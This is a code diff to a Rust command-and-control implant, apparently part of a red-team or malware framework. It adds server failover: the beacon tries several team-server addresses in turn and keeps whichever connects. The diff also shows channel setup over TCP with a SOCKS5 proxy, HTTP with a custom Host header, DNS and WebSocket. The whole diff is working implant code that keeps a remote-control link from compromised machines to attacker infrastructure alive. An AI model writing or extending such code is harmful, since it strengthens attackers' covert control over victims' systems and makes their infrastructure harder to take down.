@@ -111,24 +111,55 @@ impl Beacon {
     }
 
     fn open_channel(&mut self) -> Result<(), String> {
+        // The beacon knows more than one address: when the first server is
+        // down, the next one is tried.  A server that moves does not take
+        // the implant with it.
+        let mut last = "no server configured".to_string();
+        for server in self.servers() {
+            match self.open_channel_to(&server) {
+                Ok(()) => {
+                    if server != self.cfg.server {
+                        self.log(&format!("using the server {server}"));
+                        self.cfg.server = server;
+                    }
+                    return Ok(());
+                }
+                Err(e) => last = e,
+            }
+        }
+        Err(last)
+    }
+
+    /// The addresses the beacon dials, in order.
+    fn servers(&self) -> Vec<String> {
+        let mut out: Vec<String> = Vec::new();
+        if !self.cfg.server.is_empty() {
+            out.push(self.cfg.server.clone());
+        }
+        for extra in &self.cfg.servers {
+            if !extra.is_empty() && !out.contains(extra) {
+                out.push(extra.clone());
+            }
+        }
+        out
+    }
+
+    /// Open the channel to one address.
+    fn open_channel_to(&mut self, server: &str) -> Result<(), String> {
         let ch: Box<dyn Channel> = match self.cfg.transport {
             Transport::Tcp => {
-                let mut c = TcpChannel::new(&self.cfg.server);
+                let mut c = TcpChannel::new(server);
                 if !self.cfg.proxy.is_empty() {
                     // The beacon dials through a SOCKS5 proxy: the proxy
                     // carries the traffic to the team server.
                     c = c.with_proxy(&self.cfg.proxy);
                 }
-                c.connect().map_err(|e| format!("connect {}: {e}", self.cfg.server))?;
+                c.connect().map_err(|e| format!("connect {server}: {e}"))?;
                 Box::new(c)
             }
             Transport::Http => Box::new(
-                HttpChannel::new(
-                    &self.cfg.server,
-                    &self.cfg.http_path,
-                    &self.cfg.http_host_header,
-                )
-                .map_err(|e| format!("http channel: {e}"))?,
+                HttpChannel::new(server, &self.cfg.http_path, &self.cfg.http_host_header)
+                    .map_err(|e| format!("http channel: {e}"))?,
             ),
             Transport::Dns => Box::new(
                 crate::dns::DnsChannel::new(
@@ -140,7 +171,7 @@ impl Beacon {
             ),
             Transport::Ws => Box::new(
                 crate::ws::WsChannel::new(
-                    &self.cfg.server,
+                    server,
                     &self.cfg.ws_path,
                     &self.cfg.ws_host_header,
                 )
